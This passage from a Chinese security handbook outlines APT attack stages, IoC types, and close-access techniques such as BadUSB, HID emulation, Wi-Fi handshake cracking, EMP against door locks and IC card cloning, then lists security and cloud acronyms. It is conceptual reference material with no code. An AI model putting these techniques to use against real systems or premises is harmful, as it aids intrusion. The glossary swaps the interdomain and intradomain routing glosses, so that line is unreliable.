在攻击中就至少使用了六个零日漏洞。</span></p></blockquote><h3 id='持续性persistent）'><span>持续性（Persistent）</span></h3><blockquote><p><span>和传统的基于短期利益的网络攻击有很大的不同。APT 攻击的过程通常包括多个实施阶段。攻击者很很多情况下都是使用逐层渗透的方式来突破高级的防御系统，整个攻击过程一般持续时间会达到几个月甚至数年。一般来说，APT 攻击可以分为以下几个阶段。</span></p></blockquote><h4 id='侦查阶段'><span>侦查阶段</span></h4><blockquote><p><span>为了能够找到目标的脆弱点，攻击者通常会做大量的准备工作。在这个阶段攻击者多会使用基于大数据分析的隐私收集或者基于社会工程学的攻击来收集目标的信息，为了之后的攻击做出充分的准备。</span></p></blockquote><h4 id='初次入侵阶段'><span>初次入侵阶段</span></h4><blockquote><p><span>基于初次侦查的信息，攻击者通常能收集到目标所使用的软件、操作系统系统版本等信息。在获取这些信息后，攻击者可以挖掘软件对应版本的零日漏洞或者使用已知漏洞来对系统做出初期的入侵行为，获取对目标一定的控制权限。</span></p></blockquote><h4 id='权限提升阶段'><span>权限提升阶段</span></h4><blockquote><p><span>在复杂网络中，攻击者初次入侵所获得的权限通常是较低的权限，而为了进一步的攻击，攻击者需要获取更高的权限来完成其需要的攻击行为。在这个阶段，攻击者通常会使用权限提升漏洞或者爆破密码等行为来实现权限提升的目的，最后获得系统甚至域的管理员权限。</span></p></blockquote><h4 id='保持访问阶段'><span>保持访问阶段</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>在成功入侵目标计算机并 有一定的权限之后，攻击者一般会使用各种方式来保持对系统的访问权限。其中一个比较常用的方式是窃取合法用户的登录凭证。当获取了用户的访问凭证之后，可以使用远程控制工具</span></p></blockquote><p><span>（RAT，Remote Access Tools）来建立连接，并在连接建立之后，植入特定的后门来达到持续控制的效果。</span></p><h4 id='横向扩展阶段'><span>横向扩展阶段</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>当攻击者掌握一定的目标之后，会以较慢 较隐蔽的方式逐渐在内网扩散。主要方式是先在内网进行一定的侦查。基于这些侦查，获得内网计算机的相关信息，并结合这些信息使用软件漏洞或者弱密码爆破等手段来进行横向的进一步渗透，获取更多的权限和信息。</span></p></blockquote><h4 id='攻击收益阶段'><span>攻击收益阶段</span></h4><blockquote><p><span>APT 攻击的主要目的是窃取目标系统的信息或对其造成一定的破坏。在完成横向扩展控制一定的内网机器后。以收集信息为目标的攻击者会使用加密通道的方式把获取的信息逐渐回传并消除入侵痕迹。而以造成破坏为目标的攻击，则在这个阶段进行相应的攻破坏。</span></p></blockquote><h3 id='威胁性threat）'><span>威胁性（Threat）</span></h3><blockquote><p><span>和传统攻击不同，APT 攻击的攻击手段和方案大都是针对特定的攻击对象和目的来设计。相对其他攻击，攻击者有着非常明确的目标和目的，很少会使用自动化的攻击方式，而是精确的攻击。</span></p><p><span>另外 APT 的目标多是政府机构、金融、能源等敏感企业、部门，一旦这些目标被成功攻击，其影响往往十分巨大。据目前已知的信息，在美国、俄罗斯等国的大选中，以及欧洲一些政治事件中，都有 APT 攻击出现。APT 攻击已经成为国家之前斗争的一种重要手段。</span></p></blockquote><ol start='5' ><li><h3 id='相关事件'><span>相关事件</span></h3><ul><li><span>2010 年伊朗震网病毒</span></li><li><span>2013 美国棱镜门事件</span></li><li><span>.</span><span>..</span></li></ul></li><li><h3 id='ioc'><span>IoC</span></h3></li></ol><blockquote><p><span>IoC (Indicators of Compromise) 在取证领域被定义为计算机安全性被破坏的证据。常见的 IoC 有以下几种：</span></p></blockquote><ul><li><span>hash</span></li><li><span>IP</span></li><li><span>域名</span></li><li><span>网络</span></li><li><span>主机特征</span></li><li><span>工具</span></li><li><span>TTPs</span></li></ul><ol start='7' ><li><h3 id='参考链接-参考链接-62'><span>参考链接 {#参考链接-62}</span></h3><ul><li><a href='https://projectsharp.org/2020/02/23/APTåˆ†æžåŠTTPsæå–'><span>APT 分析及 TTPs 提取</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='5' ><li><h2 id='供应链安全-2'><span>供应链安全</span></h2><ol start='' ><li><h3 id='参考链接-参考链接-63'><span>参考链接 {#参考链接-63}</span></h3><ul><li><a href='https://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html'><span>Introducing SLSA, an End-to-End Framework for Supply Chain Integrity</span></a></li></ul></li></ol></li><li><h2 id='近源渗透-2'><span>近源渗透</span></h2><ol start='' ><li><h3 id='usb-攻击'><span>USB 攻击</span></h3></li></ol></li></ol><h4 id='badusb'><span>BadUSB</span></h4><blockquote><p><span>通过重新编程 USB 设备的内部微控制器，来执行恶意操作，例如注册为键盘设备，发送特定按键进行恶意操作。</span></p></blockquote><h4 id='autorun'><span>AutoRUN</span></h4><blockquote><p><span>根据主机配置的方式，一些操作系统会自动执行位于 USB 设备存储器上的预定文件。可以通过这种方式执行恶意软件。</span></p></blockquote><h4 id='usb-killer'><span>USB Killer</span></h4><blockquote><p><span>通过特殊的 USB 设备基于电气等方式来永久销毁设备。</span></p></blockquote><h4 id='侧信道-2'><span>侧信道</span></h4><blockquote><p><span>通过改装 USB 增加一些监听/测信道传输设备。</span></p></blockquote><h4 id='hid-攻击'><span>HID 攻击</span></h4><blockquote><p><span>HID(human interface device) 指键盘、鼠标等用于为计算机提供数据输入的人机交互设备。HID 攻击指攻击者将特殊的 USB 设备模拟成为键盘，一旦连接上计算机就执行预定的恶意操作。HID 攻击可以基于 Android设备、数据线设备等实施。</span></p></blockquote><h3 id='wi-fi-2'><span>Wi-Fi</span></h3><h4 id='密码爆破'><span>密码爆破</span></h4><blockquote><p><span>基于 WPA2 的验证方式，Wi-Fi 可以通过抓握手包的方式进行线下的密码爆破。</span></p></blockquote><h4 id='信号压制'><span>信号压制</span></h4><blockquote><p><span>可以使用大功率的设备捕获握手包并模仿目标 AP，从而实现中间人攻击。</span></p></blockquote><h3 id='门禁'><span>门禁</span></h3><h4 id='电磁脉冲'><span>电磁脉冲</span></h4><blockquote><p><span>部分电子门禁和电子密码锁的电子系统中集成电路对电磁脉冲比较敏感，可以通过外加电磁脉冲 (Electro- magnetic Pulse，EMP) 的方式破坏设备，来实现打开的效果。</span></p></blockquote><h4 id='ic-卡'><span>IC 卡</span></h4><blockquote><p><span>基于变色龙等设备可以使用模拟、破解、复制 IC 卡破解门禁。</span></p></blockquote><ol start='4' ><li><h3 id='参考链接-参考链接-64'><span>参考链接 {#参考链接-64}</span></h3><ul><li><a href='https://www.secpulse.com/archives/123723.html'><span>近源渗透硬件指北</span></a></li><li><a href='https://mp.weixin.qq.com/s/dmh3dDt0BaZYIcWdSTsQcg'><span>红蓝对抗之近源渗透</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='7' ><li><h2 id='常见术语'><span>常见术语</span></h2><ol start='' ><li><h3 id='系统相关'><span>系统相关</span></h3><ul><li><span>WMI (Windows Management Instrumentation)</span></li></ul></li><li><h3 id='网络相关'><span>网络相关</span></h3></li></ol></li></ol><h4 id='网络协议'><span>网络协议</span></h4><ul><li><span>轻型目录访问协议 (Lightweight Directory Access Protocol, LDAP)</span></li><li><span>标识名 (Distinguished Name, DN)</span></li><li><span>相对标识名 (Relative Distinguished Name, RDN)</span></li><li><span>服务器消息块 (Server Message Block, SMB)</span></li><li><span>网络文件共享系统 (Common Internet File System, CIFS)</span></li><li><span>SMTP (Simple Mail Transfer Protocol)</span></li><li><span>简单网络管理协议 (Simple Network Management Protocol, SNMP)</span></li><li><span>POP3 (Post Office Protocol 3)</span></li><li><span>IMAP (Internet Mail Access Protocol)</span></li><li><span>HTTP (HyperText Transfer Protocol)</span></li><li><span>HTTPS (HyperText Transfer Protocol over Secure Socket Layer)</span></li><li><span>动态主机配置协议 (Dynamic Host Configuration Protocol, DHCP)</span></li><li><span>远程过程调用 (Remote Procedure Call, RPC)</span></li><li><span>Java 调试线协议 (Java Debug Wire Protocol, JDWP)</span></li><li><span>网络文件系统 (Network File System, NFS)</span></li><li><span>服务主体名称 (Service Principal Names, SPN)</span></li><li><span>简单身份验证 (Simple Authentication and Security Layer, SASL)</span></li><li><span>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR)</span></li></ul><h4 id='路由系统'><span>路由系统</span></h4><ul><li><span>自治系统 (Autonomous System, AS)</span></li><li><span>内部网关协议 (Interior Gateway Protocol, IGP)</span></li><li><span>外部网关协议 (External Gateway Protocol, EGP)</span></li><li><span>域内路由选择 (interdomain routing)</span></li><li><span>域间路由选择 (intradomain routing)</span></li><li><span>路由信息协议 (Routing Information Protocol, RIP)</span></li><li><span>开放最短路径优先 (Open Shortest Path First, OSPF)</span></li><li><span>动态路由协议 (Dynamic Routing Protocols, DRP)</span></li><li><span>首跳冗余性协议 (First Hop Redundancy Protocols, FHRP)</span></li><li><span>热备份路由器协议 (Hot Standby Router Protocol, HSRP)</span></li><li><span>虚拟路由冗余协议 (Virtual Router Redundancy Protocol, VRRP)</span></li><li><span>网关负载均衡协议 (Gateway Load Balancing Protocol, GLBP)</span></li><li><span>网络地址转换 (Network Address Translation, NAT)</span></li><li><span>点对点协议 (Point-to-Point Protocol, PPP)</span></li><li><span>生成树协议 (Spanning Tree Protocol, STP)</span></li><li><span>QUIC (Quick UDP Internet Connections)</span></li></ul><h4 id='网络应用'><span>网络应用</span></h4><ul><li><span>证书透明度 (Certificate Transparency, CT)</span></li><li><span>DNS 证书颁发机构授权 (DNS Certification Authority Authorization, CAA)</span></li><li><span>应用级网关 (Application Level Gateway, ALG)</span></li></ul><h4 id='kerberos-3'><span>Kerberos</span></h4><ul><li><span>密钥分发中心 (Key Distribution Center, KDC)</span></li><li><span>认证服务器 (Authentication Server, AS)</span></li><li><span>票据授权服务器 (Ticket Granting Server, TGS)</span></li></ul><ol start='3' ><li><h3 id='开发相关'><span>开发相关</span></h3><ul><li><span>REST (Representation State Transformation)</span></li></ul></li><li><h3 id='安全相关'><span>安全相关</span></h3><ul><li><h4 id='缺点-defect--mistake'><span>缺点 (defect / mistake)</span></h4><ul><li><span>软件在实现上和设计上的弱点</span></li><li><span>缺点是缺陷和瑕疵的统称</span></li></ul></li><li><h4 id='缺陷-bug'><span>缺陷 (bug)</span></h4><ul><li><span>实现层面的软件缺点</span></li><li><span>容易被发现和修复</span></li><li><span>例如：缓冲区溢出</span></li></ul></li><li><h4 id='瑕疵-flaw'><span>瑕疵 (flaw)</span></h4><ul><li><span>一种设计上的缺点，难以察觉</span></li><li><span>瑕疵往往需要人工分析才能发现</span></li><li><span>软件系统中错误处理或恢复模块，导致程序不安全或失效</span></li></ul></li><li><h4 id='漏洞-vulnerability'><span>漏洞 (vulnerability)</span></h4><ul><li><span>可以用于违反安全策略的缺陷或瑕疵</span></li></ul></li><li><p><span>交互式应用程序安全测试 (Interactive Application Security Testing, IAST)</span></p></li><li><p><span>动态应用程序安全测试 (Dynamic Application Security Testing, DAST)</span></p></li><li><p><span>静态应用程序安全测试 (Static Application Security Testing, SAST)</span></p></li><li><p><span>ATT&amp;CK™ (Adversarial Tactics, Techniques, and Common Knowledge, ATT&amp;CK)</span></p></li><li><p><span>横向移动 (Lateral Movement)</span></p></li></ul></li></ol><h4 id='安全开发-安全开发-2'><span>安全开发 {#安全开发-2}</span></h4><ul><li><span>安全信息和事件管理 (Security Information Event Management, SIEM)</span></li><li><span>自动化响应 SOAR 模型 (Security Orchestration, Automation and Response, SOAR)</span></li><li><span>SDL (Security Development Lifecycle)</span></li></ul><h4 id='安全策略'><span>安全策略</span></h4><ul><li><span>跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)</span></li><li><span>发件人策略框架 (Sender Policy Framework, SPF)</span></li><li><span>域名密钥识别邮件 (DomainKeys Identified Mail, DKIM)</span></li><li><span>基于域名的消息认证报告与一致性协议 (Domain-based Message Authentication, Reporting and Con- formance, DMARC)</span></li><li><span>DNSSEC (The Domain Name System Security Extensions)</span></li><li><span>基于 DNS 的命名实体身份验证 (DNS-based Authentication of Named Entities, DANE)</span></li></ul><h4 id='安全模型'><span>安全模型</span></h4><ul><li><span>构建安全成熟度模型 (Building Security In Maturity Model, BSIMM)</span></li></ul><h3 id='攻击相关'><span>攻击相关</span></h3><h4 id='漏洞类型'><span>漏洞类型</span></h4><ul><li><span>跨站脚本攻击 (Cross Site Scripting, XSS)</span></li><li><span>跨站请求伪造 (Cross-Site Request Forgery, CSRF)</span></li><li><span>中间人攻击 (Man-in-the-middle, MITM)</span></li><li><span>服务端请求伪造 (Server Side Request Forgery, SSRF)</span></li><li><span>高级持续威胁 (Advanced Persistent Threat, APT)</span></li><li><span>远程命令执行 (Remote Command Execute, RCE)</span></li><li><span>远程代码执行 (Remote Code Execute, RCE)</span></li><li><span>带外数据 (Out-Of-Band, OOB)</span></li></ul><h4 id='攻击方式'><span>攻击方式</span></h4><ul><li><span>鱼叉攻击 (Spear Phishing)</span></li><li><span>水坑攻击 (Water Holing)</span></li><li><span>分布式拒绝服务 (Distributed Denial of Service, DDoS)</span></li></ul><ol start='6' ><li><h3 id='防御相关'><span>防御相关</span></h3><ul><li><span>IoC (Indicators of Compromise)</span></li></ul></li></ol><h4 id='防御技术-防御技术-1'><span>防御技术 {#防御技术-1}</span></h4><ul><li><span>网络检测响应 (Network-based Detection and Response, NDR)</span></li><li><span>终端检测响应 (Endpoint Detection and Response, EDR)</span></li><li><span>托管检测响应 (Managed Detection and Response, MDR)</span></li><li><span>扩展检测响应 (Extended Detection and Response, XDR)</span></li><li><span>自适应安全架构 (Adaptive Security Architecture, ASA)</span></li><li><span>零信任网络访问 (Zero Trust Network Access, ZTNA)</span></li><li><span>云安全配置管理 (Cloud Security Posture Management, CSPM)</span></li></ul><h4 id='防护设施'><span>防护设施</span></h4><ul><li><span>入侵检测系统 (Intrusion Detection System, IDS)</span></li><li><span>主机型入侵检测系统 (Host-based Intrusion Detection System, HIDS)</span></li><li><span>主机入侵防御系统 (Host Intrusion Prevent System, HIPS)</span></li><li><span>RASP (Runtime Application Self-protection)</span></li><li><span>统一端点管理 (Unified Endpoint Management, UEM)</span></li></ul><ol start='7' ><li><h3 id='运维-2'><span>运维</span></h3><ul><li><span>智能运维 (Artificial Intelligence for IT Operations, AIOps)</span></li><li><span>风险和脆弱性评估 (Risk and Vulnerability Assessments, RVA)</span></li><li><span>计算机安全应急响应组 (Computer Emergency Response Team, CERT)</span></li></ul></li><li><h3 id='认证-2'><span>认证</span></h3><ul><li><span>单点登录 (Single Sign-On, SSO)</span></li><li><span>双因素认证 (Two-Factor Authentication, 2FA)</span></li><li><span>多因素认证 (Multi-Factor Authentication, MFA)</span></li><li><span>一次性密码 (One-Time Password, OTP)</span></li></ul></li></ol><h4 id='kerbose'><span>Kerbose</span></h4><ul><li><span>认证服务器 (Authentication Server, AS)</span></li><li><span>密钥分发中心 (Key Distribution Center, KDC)</span></li><li><span>票据授权票据，票据的票据 (Ticket Granting Ticket, TGT)</span></li><li><span>票据授权服务器 (Ticket Granting Server, TGS)</span></li><li><span>特定服务提供端 (Service Server, SS)</span></li></ul><ol start='9' ><li><h3 id='可信计算'><span>可信计算</span></h3><ul><li><span>可信平台模块 (Trusted Platform Module, TPM)</span></li></ul></li><li><h3 id='云'><span>云</span></h3></li></ol><h4 id='容器-3'><span>容器</span></h4><ul><li><span>容器运行时 (Container Runtime Interface, CRI)</span></li><li><span>开放容器标准 (Open Container Initiative, OCI)</span></li><li><span>开放容器格式标准 (Open Container Format, OCF)</span></li></ul><h4 id='计算'><span>计算</span></h4><ul><li><span>弹性云计算 (Elastic Compute Cloud, EC2)</span></li><li><span>阿里云弹性云计算 (Elastic Compute Service, ECS)</span></li><li><span>云服务器 (Cloud Virtual Machine, CVM)</span></li></ul><h4 id='存储'><span>存储</span></h4><ul><li><span>简单存储服务 (Simple Storage Service, S3)</span></li><li><span>对象存储 (Cloud Object Storage, COS)</span></li></ul><h4 id='xaas'><span>XaaS</span></h4><ul><li><span>函数即服务 (Function as a Service, FaaS)</span></li><li><span>容器即服务 (Container as a Service, CaaS)</span></li><li><span>软件即服务 (Software as a Service, SaaS)</span></li><li><span>平台即服务 (Platform as a Service, PaaS)</span></li><li><span>基础设施即服务 (Insfrastructure as a Service, IaaS)</span></li></ul><h4 id='特定平台'><span>特定平台</span></h4><ul><li><span>OCI (Oracle Cloud Infrastructure)</span></li></ul><h4 id='其他服务'><span>其他服务</span></h4><ul><li><span>元数据服务 (Instance Metadata Service, IMDS)</span></li><li><span>持续集成 (Continuous Integration, CI)</span></li><li><span>持续交付 (Continuous Deployment, CD)</span></li><li><span>边缘计算机器 (Edge Computing Machine, ECM)</span></li></ul></div></div>
</body>
</html>